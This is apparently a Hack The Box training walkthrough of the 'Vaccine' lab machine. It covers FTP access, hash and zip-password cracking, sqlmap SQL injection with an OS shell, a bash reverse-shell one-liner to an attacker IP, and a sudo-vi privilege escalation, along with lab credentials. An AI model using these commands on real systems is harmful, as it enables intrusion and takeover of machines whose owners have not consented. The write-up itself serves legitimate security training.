Hack The Box :: Starting Point :: Vaccine :: Linux

# Enumeration

**Note**: this starting point machine only features a `root.txt`
We begin by running an Nmap scan.
`nmap -sC -sV 10.10.10.46`

[nmap.webp](../_resources/5b87d89820f7dbdd535e804c6161d8c1.webp)

Running a simple Nmap scan reveals three open ports running, for FTP, SSH and Apache respectively.

The credentials `ftpuser / mc@F1l3ZilL4` can be used to login to the FTP server.

[ftp.webp](../_resources/3ba3eaf2b094623b3207deaa80d33669.webp)

A file named `backup.zip` is found in the folder. Extraction of the archive fails as it's password protected. The password can be cracked using JohntheRipper and rockyou.txt.

[image-20200203173115021.webp](../_resources/b35b201af810ad5e9b0f4d711f2133f1.webp)

The password is found to be `741852963`. Extracting it's contents using the password reveals a PHP file and a CSS file.

[image-20200203173250433-1580733292764.webp](../_resources/eda6ef9ad2243e157f54f49fdcb414a2.webp)

Looking at the PHP source code, we find a login check.

	<?php
	session_start();
	  if(isset($_POST['username']) && isset($_POST['password'])) {
	    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {                                                                       $_SESSION['login'] = "true";
	      header("Location: dashboard.php");
	    }
	  }
	?>

The input password is hashed and compared to the MD5 hash: `2cb42f8734ea607eefed3b70af13bbd3`. This hash can be easily cracked using an online rainbow table such as crackstation.

[image-20200203173503825.webp](../_resources/80a9cb0cf5b6906d3fdd5f9d0a35850a.webp)

The password is cracked as `qwerty789`.

# Foothold

Browsing to port 80, we can see a login page for MegaCorp.

[login.webp](../_resources/3d06ad949982bc1f6b83990ef337a343.webp)

The credentials `admin / qwerty789` can be used to login.

[dashboard.webp](../_resources/34a7e08ec60b35c72824efcd9c9f8b0e.webp)

The page is found to host a `Car Catalogue`, and contains functionality to search for products. Searching for a term results in the following request.

`http://10.10.10.46/dashboard.php?search=a`

The page takes in a GET request with the parameter `search`. This URL is supplied to sqlmap, in order to test for SQL injection vulnerabilities. The website uses cookies, which can be specified using `--cookie`.

Right-click the page and select `Inspect Element`. Click the `Storage` tab and copy the PHP Session ID.

[cookie.webp](../_resources/02c0f8870f76c0355e6059a42806cf74.webp)

We can construct the Sqlmap query as follows:

`sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls"`

[sqlmap.webp](../_resources/468d925659cbc7ac2e90bd1e7776a028.webp)

Sqlmap found the page to be vulnerable to multiple injections, and identified the backend DBMS to be PostgreSQL. Getting code execution in postgres is trivial using the `--os-shell` command.

[os-shell.webp](../_resources/174df6dcf49e21c4a9cabfa4b958a2b6.webp)

This can be used to execute a bash reverse shell.
`bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`

[reverse-shell.webp](../_resources/6588b78f431dbcf2bd71ccf64c29a219.webp)

# Privilege Escalation

Let's upgrade to a tty shell and continue enumeration.
`SHELL=/bin/bash script -q /dev/null`

Looking at the source code of `dashboard.php` in `/var/www/html` reveals the postgres password to be: `P@s5w0rd!`.

	try {
	   $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
	 }

This password can be used to view the user's sudo privileges.

[image-20200204173955748.webp](../_resources/5c3865f5e0b622278829c77168e50571.webp)

The user is allowed to edit the configuration `/etc/postgresql/11/main/pg_hba.conf` using vi. This can be leveraged to gain a root shell and access root.txt.

[image-20200203180325408.webp](../_resources/33b19bc4bef56ef16eda96c1ab9a2d47.webp)